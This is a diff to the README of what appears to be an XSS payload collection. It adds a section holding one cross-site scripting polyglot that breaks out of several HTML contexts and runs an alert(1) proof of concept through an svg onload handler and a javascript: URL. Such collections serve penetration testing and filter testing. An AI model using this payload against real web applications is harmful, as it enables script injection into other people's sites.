@@ -15,6 +15,11 @@ If you have any XSS payload, just create a PullRequest.
 # Write-Ups 
 https://medium.com/p/92ac1180e0d0
 
+# My love polyglot
+```
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+```
+
 # Todos 
 
 - [ ] XSS payloads for url fields
